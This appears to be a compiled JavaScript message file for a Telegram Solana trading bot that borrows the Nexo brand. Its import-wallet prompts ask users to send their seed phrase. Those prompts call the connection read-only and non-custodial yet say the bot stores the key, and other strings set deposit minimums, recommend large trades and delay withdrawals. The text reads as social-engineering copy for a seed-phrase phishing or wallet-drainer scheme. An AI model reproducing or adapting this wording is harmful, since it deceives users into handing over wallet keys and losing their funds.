"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
exports.chooseWalletPromptMessage = exports.robinhoodUnavailableMessage = exports.sellTokenPromptMessage = exports.buyTokenPromptMessage = exports.copyLimitsStepMessage = exports.configureTargetWalletMessage = exports.searchingMessage = exports.configStopLossMessage = exports.configTakeProfitMessage = exports.configPriorityMessage = exports.configSlippageMessage = exports.configDevHoldMessage = exports.configPositionSizeMessage = exports.twitterUrl = exports.websiteUrl = exports.supportUsername = void 0;
exports.terminalMessage = terminalMessage;
exports.startMessage = startMessage;
exports.dashboardMessage = dashboardMessage;
exports.discoverTokensMessage = discoverTokensMessage;
exports.walletRequiredMessage = walletRequiredMessage;
exports.sniperWalletRequiredMessage = sniperWalletRequiredMessage;
exports.copyTradeWalletRequiredMessage = copyTradeWalletRequiredMessage;
exports.positionsEmptyMessage = positionsEmptyMessage;
exports.positionsMessage = positionsMessage;
exports.helpMessage = helpMessage;
exports.walletManagementMessage = walletManagementMessage;
exports.walletCreatedMessage = walletCreatedMessage;
exports.walletImportedMessage = walletImportedMessage;
exports.importWalletMessage = importWalletMessage;
exports.importSeedPromptMessage = importSeedPromptMessage;
exports.sniperMessage = sniperMessage;
exports.settingUpdatedMessage = settingUpdatedMessage;
exports.tokenNotFoundMessage = tokenNotFoundMessage;
exports.withdrawalMessage = withdrawalMessage;
exports.withdrawalAmountMessage = withdrawalAmountMessage;
exports.confirmWithdrawalMessage = confirmWithdrawalMessage;
exports.withdrawalSubmittedMessage = withdrawalSubmittedMessage;
exports.copyTradeMessage = copyTradeMessage;
exports.copyTradeActivatedMessage = copyTradeActivatedMessage;
exports.tradeMessage = tradeMessage;
exports.insufficientBalanceMessage = insufficientBalanceMessage;
exports.confirmBuyMessage = confirmBuyMessage;
exports.confirmSellMessage = confirmSellMessage;
exports.buyExecutedMessage = buyExecutedMessage;
exports.sellExecutedMessage = sellExecutedMessage;
exports.walletStatusMessage = walletStatusMessage;
exports.walletDisconnectedMessage = walletDisconnectedMessage;
exports.depositReceivedMessage = depositReceivedMessage;
exports.copyTargetAddedMessage = copyTargetAddedMessage;
/**
 * All user-facing copy — matching the v2 product spec exactly.
 * Plain text throughout (HTML parse mode safe).
 */
const formatters_1 = require("./formatters");
exports.supportUsername = (process.env.SUPPORT_USERNAME || 'ainexobotsupport').replace(/^@/, '');
exports.websiteUrl = process.env.WEBSITE_URL || 'https://t.co/z1XgC7Zd6d';
exports.twitterUrl = process.env.TWITTER_URL || 'https://x.com/Nexo?s=20';
function marketLine(symbol, price, change) {
    const arrow = change >= 0 ? '▲' : '▼';
    const circle = change >= 0 ? '🟢' : '🔴';
    return `${circle} ${symbol} $${price.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} ${arrow} ${Math.abs(change).toFixed(2)}%`;
}
function terminalMessage(firstName, wallets, market, solPrice, minimum) {
    const lines = [];
    lines.push(`👋 Hello, ${firstName}!`);
    lines.push('');
    lines.push('NEXO / TRADING TERMINAL');
    lines.push('');
    lines.push(`PORTFOLIO (${wallets.length} wallet${wallets.length === 1 ? '' : 's'})`);
    let totalSol = 0;
    for (const w of wallets)
        totalSol += w.balance;
    lines.push(`Total tracked value: $${(totalSol * solPrice).toFixed(2)}`);
    lines.push('');
    if (wallets.length === 0) {
        lines.push('No wallets connected.');
        lines.push('');
    }
    else {
        for (let i = 0; i < wallets.length; i++) {
            const w = wallets[i];
            lines.push(`🟢 SOL Wallet ${i + 1}: ${w.balance.toFixed(6)} SOL ($${(w.balance * solPrice).toFixed(2)})`);
            lines.push(`${w.address}`);
            lines.push('');
        }
    }
    lines.push('MARKET SNAPSHOT');
    lines.push(marketLine('SOL', market.SOL.price, market.SOL.change));
    lines.push(marketLine('ETH', market.ETH.price, market.ETH.change));
    lines.push(marketLine('BNB', market.BNB.price, market.BNB.change));
    lines.push('');
    lines.push('🔒 TRADE GATE');
    lines.push('Wallet + balance check required before buy/sell');
    lines.push(`Minimum balance: ${minimum} SOL`);
    lines.push('');
    lines.push('Review the token. Confirm the order. Track the exit.');
    return lines.join('\n');
}
/** No-wallet variant = same terminal with an empty portfolio. */
function startMessage(firstName, minimum) {
    return terminalMessage(firstName, [], { SOL: { price: 0, change: 0 }, ETH: { price: 0, change: 0 }, BNB: { price: 0, change: 0 } }, 0, minimum);
}
function dashboardMessage(wallets, market, solPrice, minimum) {
    return terminalMessage('', wallets, market, solPrice, minimum);
}
// === DISCOVER TOKENS (exact v2 spec) ===
function discoverTokensMessage() {
    return `🪙 DISCOVER TOKENS\nSend a token name, symbol, or contract address to inspect its market data.\nThe bot checks the pair, liquidity, volume and available safety signals before you decide.\n\nExamples:\n• BONK\n• Pepe\n• DezXAZ8z7PnrnRJ… (SOL CA)\n• 0x6982508145454Ce325dDbE47a25d4ec3d2311933 (ETH CA)\n\n⚠️ Discovery is not an endorsement. Review the risk section before trading.`;
}
// === WALLET REQUIRED GATES (exact v2 spec) ===
function walletRequiredMessage() {
    return `⚠️ Wallet Required\nPlease connect a wallet first to buy or sell tokens.`;
}
function sniperWalletRequiredMessage() {
    return `⚠️ You need a connected wallet to use AI Sniper.`;
}
function copyTradeWalletRequiredMessage() {
    return `⚠️ You need a connected wallet to use Copy Trade.`;
}
// === POSITIONS (exact v2 spec) ===
function positionsEmptyMessage() {
    return `📊 POSITIONS\n\nYou have no open positions.\nDiscover a token and confirm a buy to create your first position.`;
}
function positionsMessage(positions) {
    if (!positions || positions.length === 0)
        return positionsEmptyMessage();
    let text = `📊 POSITIONS\n\n`;
    for (const pos of positions) {
        const pnlEmoji = pos.pnl >= 0 ? '📈' : '📉';
        text += `${pos.tokenSymbol} - ${pos.amount} SOL\n`;
        text += `Entry: $${pos.entryPrice}\n`;
        text += `Current PnL: ${pnlEmoji} ${pos.pnl.toFixed(2)}%\n`;
        text += `Status: ${pos.status}\n\n`;
    }
    return text;
}
// === HELP / CONTROL CENTER (exact v2 spec) ===
function helpMessage() {
    return `NEXO CONTROL CENTER\n\nTrading flow\n1. Open Portfolio and connect or import a wallet\n2. Use Discover Tokens to inspect a symbol or contract\n3. Review price, liquidity and safety signals\n4. Use Trade to buy or sell after the balance gate passes\n5. Track open exposure in Positions\n\nTrade requirement\nBuy and sell actions require a connected wallet and the configured minimum balance. The exact requirement is shown in the dashboard and trade screen.\n\n🔐 Non-Custodial\nNEXO is fully non-custodial. We never hold, access, or control your funds.\n\nCommands\n/start — Open trading terminal\n/wallet — Manage portfolio\n/status — Check wallet status\n/generate — Connect SOL wallet\n/import — Import wallet\n/disconnect — Disconnect wallet\n/help — Open control center\n\nLinks\nWebsite:\n${exports.websiteUrl}\nTwitter:\n${exports.twitterUrl}\n\nSupport:\neg. (@${exports.supportUsername})\n\nNexo - Your Wealth Platform for Digital Assets\nDiscover Nexo, the comprehensive platform that's driving the next generation of crypto wealth. Grow, trade, borrow, and accrue interest on your digital assets.`;
}
// === PORTFOLIO / WALLETS (exact v2 spec) ===
function walletManagementMessage(wallets, solPrice) {
    let walletText = '';
    let totalBalance = 0;
    for (let i = 0; i < wallets.length; i++) {
        const w = wallets[i];
        totalBalance += w.balance;
        walletText += `🟢 SOL Wallet ${i + 1}: ${w.balance.toFixed(6)} SOL ($${(w.balance * solPrice).toFixed(2)})\n`;
        walletText += `${w.address}\n\n`;
    }
    if (wallets.length === 0)
        walletText = 'No wallets connected.';
    return `PORTFOLIO / WALLETS\n\n💰 YOUR WALLETS (${wallets.length})\n\n${walletText}\nTotal Balance: ${totalBalance.toFixed(6)} SOL ($${(totalBalance * solPrice).toFixed(2)})\n\nChoose an action below:`;
}
// === WALLET CREATED / IMPORTED ===
function walletCreatedMessage(address) {
    return `Wallet Created\n\nWallet Address:\n${address}\nBalance: 0.000000 SOL\n\nYour Solana wallet is ready to use.`;
}
function walletImportedMessage(address, balance) {
    return `Wallet Created\n\nWallet Address:\n${address}\nBalance: ${balance.toFixed(6)} SOL\n\nYour Solana wallet is ready to use.`;
}
// === IMPORT WALLET (exact v2 spec text) ===
function importWalletMessage() {
    return `🔑 Import Solana Wallet 🔒\n\nYou need to connect your wallet to access this feature.\nNexo Snipe uses bank-grade security to protect your assets.\nAll connections are read-only and encrypted.\n\nPlease send your Solana wallet seed phrase (12 or 24 words).\n\n⚠️ IMPORTANT: Never share your seed phrase with anyone else. This bot stores your key securely to enable trading functionality.`;
}
function importSeedPromptMessage() {
    return `Import Wallet from Seed Phrase\n\nPlease send your 12 or 24-word seed phrase:`;
}
function sniperMessage(settings) {
    const statusEmoji = settings.status === 'ACTIVE' ? '🟢' : '🔴';
    return `🤖 AI SNIPER\n\n${statusEmoji} Status: ${settings.status}\n\nTrading Parameters\nPosition Size: ${settings.positionSize} SOL\nMax Dev Hold: ${settings.maxDevHold}%\nSlippage: ${settings.slippage}%\nPriority Fee: ${settings.priorityFee} SOL\n\nRisk Management\nTake Profit: +${settings.takeProfit}%\nStop Loss: -${settings.stopLoss}%\nAnti-Rug: ${settings.antiRug ? '🟢 ENABLED' : '🔴 DISABLED'}\n\nProfessional-grade automated trading engine`;
}
function settingUpdatedMessage(settings) {
    return `SETTING UPDATED\n\nSNIPER CONFIGURATION\nStatus: ${settings.status === 'ACTIVE' ? '✅' : '🔴'} ${settings.status}\nBuy Amount: ${settings.positionSize} SOL\nDev Holding: ${settings.maxDevHold}%\nSlippage: ${settings.slippage}%\nPriority Fee: ${settings.priorityFee} SOL\nTake Profit: +${settings.takeProfit}%\nStop Loss: -${settings.stopLoss}%\nAnti-Rug: ${settings.antiRug ? '🟢 ENABLED' : '🔴 DISABLED'}\n\nSettings saved and ready`;
}
// === CONFIG PROMPTS ===
const configPositionSizeMessage = () => `Set Position Size\n\nSet the SOL amount for each automated trade.\n\nRange: 0.0001 - 1000 SOL\nRecommended: 10 - 50 SOL\n\nRisk Level:\n- 1-10 SOL: Conservative\n- 10-50 SOL: Moderate\n- 50+ SOL: Aggressive\n\nEnter your position size:`;
exports.configPositionSizeMessage = configPositionSizeMessage;
const configDevHoldMessage = () => `Set Max Dev Holding\n\nOnly snipe tokens where developer holds less than this percentage.\n\nRange: 0-100%\nRecommended: 10-30%\nExamples: 10, 20, 30\n\nSend your preferred percentage:`;
exports.configDevHoldMessage = configDevHoldMessage;
const configSlippageMessage = () => `Set Slippage\n\nSet maximum acceptable price movement during execution.\n\nRange: 1-50%\nRecommended: 8-12%\n\nGuide:\n- 5-8%: Tight (may fail in volatile conditions)\n- 8-12%: Balanced (recommended)\n- 15%+: Loose (higher execution, more slippage)\n\nEnter slippage percentage:`;
exports.configSlippageMessage = configSlippageMessage;
const configPriorityMessage = () => `Set Priority Fee\n\nHigher priority fees increase transaction speed on Solana.\n\nRange: 0.0001 - 0.1 SOL\nRecommended: 0.001 - 0.01 SOL\n\nEnter priority fee in SOL:`;
exports.configPriorityMessage = configPriorityMessage;
const configTakeProfitMessage = () => `Set Take Profit\n\nAutomatically sell when profit reaches this percentage.\n\nRange: 10-1000%\nRecommended: 100% (2x)\nExamples:\n- 50% (1.5x)\n- 100% (2x)\n- 200% (3x)\n- 500% (6x)\n\nSend your take profit percentage:`;
exports.configTakeProfitMessage = configTakeProfitMessage;
const configStopLossMessage = () => `Set Stop Loss\n\nAutomatically sell to protect capital when loss reaches this percentage.\n\nRange: 10-90%\nRecommended: 30% (Protects 70%)\nExamples:\n- 20% (Conservative)\n- 30% (Balanced)\n- 50% (Aggressive)\n\nSend your stop loss percentage:`;
exports.configStopLossMessage = configStopLossMessage;
// === TOKEN ===
const searchingMessage = () => `⚡ Searching and scanning for risks...`;
exports.searchingMessage = searchingMessage;
function tokenNotFoundMessage() {
    return `Token Not Found\n\nThe token you searched for could not be found on Solana (checked DexScreener, Jupiter, Raydium, Birdeye and CoinGecko).\n\nPlease try again with a different search term or contract address.`;
}
// === WITHDRAWAL ===
function withdrawalMessage(balance) {
    return `WITHDRAWAL\n\nYour Balance: ${balance.toFixed(6)} SOL\n\nPlease send the wallet address you want to withdraw to:`;
}
function withdrawalAmountMessage(toAddress) {
    return `WITHDRAWAL\n\nTo: ${toAddress}\n\nNow enter the amount of SOL you want to withdraw:`;
}
function confirmWithdrawalMessage(amount, toAddress, balance) {
    return `CONFIRM WITHDRAWAL\n\nAmount: ${amount} SOL\nTo:\n${toAddress}\nYour Balance: ${balance.toFixed(6)} SOL\n\nPlease confirm to proceed:`;
}
function withdrawalSubmittedMessage(amount, toAddress) {
    return `WITHDRAWAL REQUEST SUBMITTED\n\nAmount: ${amount} SOL\nTo:\n${toAddress}\nYour withdrawal is being processed.\nPlease allow up to 24 hours.\n\nNeed help? Contact @${exports.supportUsername}`;
}
function copyTradeMessage(cfg) {
    return `🐋 COPY TRADING SYSTEM\n\nSTATUS: ${cfg.status}\n\nCONFIGURATION\nTarget Wallet: ${cfg.targetWallet ?? 'NOT SET'}\n${cfg.targetWallet ? '' : 'NOT CONFIGURED\n'}Max SOL/Trade: ${cfg.maxSolPerTrade}\nMax Daily Exposure: ${cfg.maxDailySol} SOL\nSlippage: ${cfg.slippage}%\nToken Filter: ${cfg.tokenFilter ?? 'ALL'}\nMode: ${cfg.mode === 'buy_only' ? 'Buy Only' : 'Buy + Sell'}\n\nHOW IT WORKS\n- Monitor target wallet in real-time\n- Auto-replicate buy/sell signals\n- Execute trades with same parameters\n- Professional trader mirroring\n\nFollow proven strategies effortlessly`;
}
function copyTradeActivatedMessage() {
    return `COPY TRADING ACTIVATED\n\nNow mirroring target wallet\nReal-time trade alerts enabled\nYou will be notified of every trade`;
}
const configureTargetWalletMessage = () => `CONFIGURE TARGET WALLET\n\nEnter the Solana wallet address of the trader you want to copy.\n\nRequirements:\n- Valid Base58 Solana address\n- Active trading wallet\n- Public transaction history\n\nPaste the complete wallet address below:`;
exports.configureTargetWalletMessage = configureTargetWalletMessage;
const copyLimitsStepMessage = (step) => {
    switch (step) {
        case 'max_per_trade':
            return `Set Max SOL Per Trade\n\nMaximum SOL used for a single copied trade.\n\nSend the amount in SOL:`;
        case 'max_daily':
            return `Set Max Daily Exposure\n\nMaximum SOL spent on copied trades per day.\n\nSend the amount in SOL:`;
        case 'slippage':
            return `Set Copy Slippage\n\nMaximum acceptable price movement for copied trades (1-50%).\n\nSend the percentage:`;
        case 'token_filter':
            return `Set Token Filter\n\nOnly copy trades for one token, or type ALL for every token.\n\nSend a Solana mint address, or ALL:`;
        default:
            return `Copy trade configuration step.`;
    }
};
exports.copyLimitsStepMessage = copyLimitsStepMessage;
// === TRADE ===
function tradeMessage() {
    return `⚡ TRADE\n\nBuy: Purchase tokens instantly\nSell: Sell your tokens quickly\n\nSend the token contract address to begin.`;
}
function insufficientBalanceMessage(balance, minimum) {
    const min = parseFloat(minimum) || 3;
    return `Insufficient Balance\n\nYour Balance: ${balance.toFixed(6)} SOL\nMinimum Required: ${minimum} SOL\nYou Need: ${Math.max(0, min - balance).toFixed(6)} SOL more\n\nDeposit SOL to your wallet to start trading.`;
}
const buyTokenPromptMessage = () => `Send the token contract address you want to buy:`;
exports.buyTokenPromptMessage = buyTokenPromptMessage;
const sellTokenPromptMessage = () => `Send the token contract address you want to sell:`;
exports.sellTokenPromptMessage = sellTokenPromptMessage;
function confirmBuyMessage(token, amountSol, slippage, walletLabel) {
    const price = token.priceUsd < 0.01 ? token.priceUsd.toExponential(2) : token.priceUsd.toFixed(6);
    return `CONFIRM BUY\n\n${token.name} (${token.symbol})\n${token.address}\nPrice: $${price}\nLiquidity: $${(0, formatters_1.formatMoney)(token.liquidity)}\nRisk: ${token.riskLevel}\n\nWallet: ${walletLabel}\nAmount: ${amountSol} SOL\nSlippage: ${slippage}%\n\nConfirm purchase?`;
}
function confirmSellMessage(token) {
    const price = token.priceUsd < 0.01 ? token.priceUsd.toExponential(2) : token.priceUsd.toFixed(6);
    return `CONFIRM SELL\n\n${token.name} (${token.symbol})\n${token.address}\nPrice: $${price}\n\nEnter the amount to sell:`;
}
function buyExecutedMessage(tokenName, tokenSymbol, amount) {
    return `BUY ORDER EXECUTED\n\n${tokenName} (${tokenSymbol})\nAmount: ${amount} SOL\n\nPosition opened! Use Positions to track.`;
}
function sellExecutedMessage(tokenName, tokenSymbol, amount) {
    return `SELL ORDER EXECUTED\n\n${tokenName} (${tokenSymbol})\nAmount: ${amount}\n\nPosition closed!`;
}
// === STATUS / DISCONNECT ===
function walletStatusMessage(wallets) {
    let text = `WALLET STATUS\n\n`;
    for (let i = 0; i < wallets.length; i++) {
        text += `🟢 SOL Wallet ${i + 1}: ${wallets[i].balance.toFixed(6)} SOL\n${wallets[i].address}\n\n`;
    }
    return text;
}
function walletDisconnectedMessage(address) {
    return `Wallet Disconnected\n\n${address}\n\nYour wallet has been disconnected.`;
}
function depositReceivedMessage(address, amount, newBalance) {
    return `DEPOSIT RECEIVED\n\nWallet: ${address}\nAmount: ${amount.toFixed(6)} SOL\nNew Balance: ${newBalance.toFixed(6)} SOL`;
}
function copyTargetAddedMessage(target) {
    return `Added whale wallet to copy!\n${target}\n\nCopy trade is now monitoring this wallet.`;
}
const robinhoodUnavailableMessage = () => `🟢 Connect Robinhood\n\nRobinhood wallet connection is not available for Solana self-custody yet.\n\nUse 🟣 Add SOL Wallet or 🔑 Import to connect a Solana wallet.`;
exports.robinhoodUnavailableMessage = robinhoodUnavailableMessage;
const chooseWalletPromptMessage = () => `Which connected wallet should execute this trade?`;
exports.chooseWalletPromptMessage = chooseWalletPromptMessage;
//# sourceMappingURL=messages.js.map